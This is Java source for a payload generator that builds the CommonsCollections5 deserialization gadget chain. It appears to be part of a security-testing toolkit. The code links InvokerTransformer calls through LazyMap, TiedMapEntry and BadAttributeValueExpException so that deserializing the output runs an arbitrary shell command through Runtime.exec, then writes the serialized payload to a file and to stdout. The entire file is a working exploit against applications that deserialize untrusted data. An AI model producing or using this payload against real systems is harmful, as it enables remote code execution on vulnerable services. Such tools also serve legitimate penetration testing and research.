package com.kindredgroup.mkallserial.payloads;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import javax.management.BadAttributeValueExpException;

import java.io.FileInputStream;
import java.io.File;
//import java.lang.string;

public class CommonsCollections5 {
    public static void main(String[] args) throws Exception {
        
        String command = "";
        if (args.length == 1)
        {
            command = args[0];
        } else {
            command = "touch /tmp/vuln.txt";
        }

        /* Java.Lang.Runtime.Exec Serialization gadget */

        ConstantTransformer Runtime_class = new ConstantTransformer(java.lang.Runtime.class);

        InvokerTransformer getMethod = new InvokerTransformer("getMethod", 
            new Class[]{String.class, Class[].class}, 
            new Object[]{"getRuntime", new Class[]{}
        });
        
        InvokerTransformer invoke = new InvokerTransformer("invoke", 
            new Class[]{Object.class, Object[].class}, 
            new Object[]{null, new Object[]{}
        });

        InvokerTransformer exec = new InvokerTransformer("exec", 
            new Class[]{String[].class}, 
            new Object[]{ new String[]{"/bin/sh", "-c", command}
        });

        Transformer[] transformers = new Transformer[]{Runtime_class, getMethod, invoke, exec};
        
        ChainedTransformer TransformerChain = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, TransformerChain);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"c014");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("c014");
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, tiedMapEntry);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.cer"));
        oos.writeObject(badAttributeValueExpException);
        oos.close();

        /* Test payload */
        /*ObjectInputStream  in = new ObjectInputStream(new FileInputStream("object.cer"));
        in.readObject();
        in.close();*/

        /* To stdout */
        File file = new File("object.cer");

		FileInputStream fis = new FileInputStream(file);
		int oneByte;
		while ((oneByte = fis.read()) != -1) {
			System.out.write(oneByte);
		}
		System.out.flush();        
        fis.close();
        
    }   
}
